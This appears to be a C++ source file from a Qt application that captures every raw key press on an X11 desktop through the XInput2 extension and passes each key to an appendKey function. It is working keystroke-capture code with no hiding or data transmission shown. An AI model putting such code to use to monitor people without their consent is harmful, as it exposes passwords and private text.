#include "keylogger.h"

#include "keys.h"

#include <QDebug>
#include <QFile>
#include <QStandardPaths>

#include <X11/keysymdef.h>
#include <X11/XKBlib.h>
#include <X11/Xlib.h>
#include <X11/Xos.h>
#include <X11/Xproto.h>
#include <X11/Xutil.h>
#include <X11/extensions/XInput2.h>

//void KeyLogger::quit()
//{
//    running = false;
//}

void KeyLogger::run_native()
{
    const char *hostname = ":0";

    // Set up X
    Display *disp = XOpenDisplay(hostname);
    if (nullptr == disp) {
        fprintf(stderr, "Cannot open X display: %s\n", hostname);
        return;
    }

    // Test for XInput 2 extension
    int xi_opcode;
    int queryEvent, queryError;
    if (!XQueryExtension(disp, "XInputExtension", &xi_opcode, &queryEvent, &queryError)) {
        // XXX Test version >=2
        fprintf(stderr, "X Input extension not available\n");
        return;
    }

    // Register events
    Window root = DefaultRootWindow(disp);
    XIEventMask m;
    m.deviceid = XIAllMasterDevices;
    m.mask_len = XIMaskLen(XI_LASTEVENT);
    m.mask = (unsigned char *) calloc(m.mask_len, sizeof(char));
    XISetMask(m.mask, XI_RawKeyPress);
    XISetMask(m.mask, XI_RawKeyRelease);
    XISelectEvents(disp, root, &m, 1);
    XSync(disp, false);
    free(m.mask);

    running = true;
    while (running) { // Forever
        XEvent event;
        XGenericEventCookie *cookie = (XGenericEventCookie *) &event.xcookie;
        XNextEvent(disp, &event);
        int success = XGetEventData(disp, cookie);

        if (success && cookie->type == GenericEvent && cookie->extension == xi_opcode) {
            switch (cookie->evtype) {
                //            case XI_RawKeyRelease:
                //                if (!printKeyUps) continue;

            case XI_RawKeyPress: {
                XIRawEvent *ev = (XIRawEvent *) cookie->data;

                // Ask X what it calls that key
                KeySym s = XkbKeycodeToKeysym(disp, ev->detail, 0, 0);
                if (NoSymbol == s)
                    continue;
                char *str = XKeysymToString(s);
                if (nullptr == str)
                    continue;

                //                if (printKeyUps) printf("%s", cookie->evtype == XI_RawKeyPress ? "+" : "-");
                //                printf("%s\n", str);

                appendKey(Keys::xkToKey(s));
                break;
            }
            }
        }
    }
}
